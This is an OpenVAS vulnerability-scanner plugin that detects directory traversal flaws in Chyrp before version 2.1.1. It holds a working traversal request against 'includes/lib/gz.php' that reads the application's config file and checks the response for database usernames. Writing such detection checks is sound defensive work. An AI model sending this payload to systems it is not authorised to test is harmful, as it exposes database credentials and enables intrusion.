###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_chyrp_mult_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Chyrp Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Shashi kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the attackers to read arbitrary files
  and gain sensitive information on the affected application.
  Impact Level: Application";
tag_affected = "Chyrp version prior to 2.1.1";
tag_insight = "Multiple flaws are due to improper validation of user supplied input to
  'file' parameter in 'includes/lib/gz.php' and 'action' parameter in
  'index.php' before being used to include files.";
tag_solution = "Upgrade to Chyrp version 2.1.1
  For updates refer to http://chyrp.net/";
tag_summary = "The host is running Chyrp and is prone to Multiple directory
  traversal vulnerabilities.";

if(description)
{
  script_id(902611);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_cve_id("CVE-2011-2780", "CVE-2011-2744");
  script_bugtraq_id(48672);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Chyrp Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45184");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/68565");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/68564");
  script_xref(name : "URL" , value : "http://www.justanotherhacker.com/advisories/JAHx113.txt");

  script_description(desc);
  script_summary("Determine if Chyrp is prone to Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## If host not supports php application then exit
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir(make_list("/blog", "/", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item: string(dir, "/"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("Powered by" >< res && ">Chyrp<" >< res)
  {

    ## construct the attack request
    url = string(dir, "/includes/lib/gz.php?file=/themes/../includes" +
                      "/config.yaml.php");

    req = http_get(item: url, port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    ## Confirm exploit worked properly or not
    if("<?php" >< res &&  "username:" >< res && "database:" >< res)
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
